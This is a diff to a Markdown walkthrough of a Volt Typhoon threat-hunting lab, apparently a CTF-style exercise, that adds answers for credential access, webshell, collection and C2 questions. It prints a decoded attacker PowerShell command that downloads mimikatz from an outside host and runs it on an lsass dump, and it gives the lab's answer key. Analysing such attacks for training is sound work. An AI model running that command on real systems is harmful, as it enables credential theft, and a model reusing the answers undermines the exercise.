@@ -206,14 +206,15 @@ Volt Typhoon often combs through target networks to uncover and extract credenti
 2. What is the full decoded command the attacker uses to download and run mimikatz?
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ### Walkthrough
-1) This was another one that could be found by doing some research on the APT in Mitre website. Just by scrolling through and learning about some of their common TTP's I was able to find the potential answers.
+1) This was another one that could be found by doing some research on the APT in Mitre website. Just by scrolling through and learning about some of their common TTP's I was able to find the potential answers. Ans: OpenSSH, putty, realvnc
 
 <img width="956" height="441" alt="CR1" src="https://github.com/user-attachments/assets/391a3770-6d0a-4f67-a06e-057b6d10603f" />
 <img width="958" height="442" alt="CR2" src="https://github.com/user-attachments/assets/689b1e6b-16ff-48a3-a717-34e65884dcce" />
 
 ---
 
-2) To find the full command I ied to filter by key words to no avail then simply filterd the powershell logs and started searching them one by one. After scrolling through 6 pages of events, I eventually came upon this long encoded command and knew it was something. I copied it into cyberchef to decode it and was able to see the command that used to download mimikatz.
+2) To find the full command I tried to filter by key words to no avail then simply filterd the powershell logs and started searching them one by one. After scrolling through 6 pages of events, I eventually came upon this long encoded command and knew it was something. I copied it into cyberchef to decode it and was able to see the command that used to download mimikatz.
+Ans: Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
 
 
 <img width="953" height="413" alt="Mi1" src="https://github.com/user-attachments/assets/bbd6deed-dab5-47a4-9e15-7f6af94dc9c7" />
@@ -226,9 +227,6 @@ Volt Typhoon often combs through target networks to uncover and extract credenti
 
 
 
-
-
-   
 
 ### Findings
 
@@ -253,12 +251,12 @@ The APT has been observed moving previously created web shells to different serv
 
 ### Walkthrough
 
-1) This was one that could be found by searching up the keyword wevutil. It turned up a few results where you could see the answers.
+1) This was one that could be found by searching up the keyword wevutil. It turned up a few results where you could see the answers. Ans: 4624 4625 4769
 
 <img width="950" height="414" alt="WE1" src="https://github.com/user-attachments/assets/918f5e41-017e-4452-acde-13a98dd983c7" />
 
 ---
-2) From task 4 you have to remember that a webshell was placed in the temp directory. By going through the powershell events one by one I saw that the command used to do so was another encoded command was used to place the web with the name ntuser.ini. Right after that the certutil command was used to decode it and change its name to iisstart.aspx, so by searching for iisstart.aspx you could've found the answer. The logic could've also been just remembering from the mitre page that Volt Typhoon uses two types of webshells, and again by searching you would have found.
+2) From task 4 you have to remember that a webshell was placed in the temp directory. By going through the powershell events one by one I saw that the command used to do so was another encoded command was used to place the web with the name ntuser.ini. Right after that the certutil command was used to decode it and change its name to iisstart.aspx, so by searching for iisstart.aspx you could've found the answer. The logic could've also been just remembering from the mitre page that Volt Typhoon uses two types of webshells, and again by searching you would have found. Ans: AuditReport.jspx
 
 
 <img width="955" height="332" alt="Copy1" src="https://github.com/user-attachments/assets/111a8225-b0fb-48ea-a311-4ac423eff4af" />
@@ -271,9 +269,20 @@ The APT has been observed moving previously created web shells to different serv
 
 ## Task 8: Collection
 
-### Evidence
+During the collection phase, Volt Typhoon extracts various types of data, such as local web browser information and valuable assets discovered within the target environment.
 
-Identify external communications.
+### Questions asked:
+
+1) The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell?
+Answer Format: Increasing order separated by a space.
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+### Walkthrough
+
+1) Honestly I happended to find these while going through all the powershell logs. Ans: 2022.csv 2023.csv 2024.csv
+
+<img width="956" height="414" alt="Finance1" src="https://github.com/user-attachments/assets/717906fa-4cd2-415d-b1ba-73b67eb7802e" />
+
+
 
 ### Findings
 
@@ -281,57 +290,31 @@ Identify external communications.
 * Beaconing behavior
 * Outbound connections
 
-### MITRE ATT&CK
-
-* T1071 – Application Layer Protocol
-
 ---
 
-## Attack Timeline
+## Task 9: C2 & Cleanup
 
-| Time  | Event                   |
-| ----- | ----------------------- |
-| Day 1 | Initial Access          |
-| Day 2 | Discovery Activity      |
-| Day 3 | Persistence Established |
-| Day 4 | Privilege Escalation    |
-| Day 5 | Lateral Movement        |
-| Day 6 | Command & Control       |
+Volt Typhoon utilizes publicly available tools as well as compromised devices to establish discreet command and control (C2) channels.
 
----
+To cover their tracks, the APT has been observed deleting event logs and selectively removing other traces and artifacts of their malicious activities.
 
-## Indicators of Compromise (IOCs)
+### Questions asked:
 
-### IP Addresses
+1.The attacker uses netsh to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy?
+Answer Format: IP Port
+2.To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
 
-* x.x.x.x
+### Walkthrough
 
-### Domains
+1) For this one you had to search for the keyword netsh
+<img width="950" height="416" alt="Netsh2" src="https://github.com/user-attachments/assets/668cb65b-6f64-4fef-a2a5-26e0db2619d9" />
 
-* example.com
 
-### File Hashes
+2) For this I filtered the powershell logs by decending time since deleteing logs is a clean up action. After scrolling through a few logs I found the answer.
+<img width="959" height="407" alt="Clean1" src="https://github.com/user-attachments/assets/f4c5e6d9-28c5-45df-a554-c9b9b378a001" />
 
-* SHA256 Hash
 
-### User Accounts
-
-* user1
-
----
-
-## MITRE ATT&CK Mapping
-
-| Tactic               | Technique |
-| -------------------- | --------- |
-| Initial Access       | T1078     |
-| Discovery            | T1082     |
-| Persistence          | T1053     |
-| Privilege Escalation | T1068     |
-| Lateral Movement     | T1021     |
-| Command & Control    | T1071     |
-
----
 
 ## Lessons Learned
 
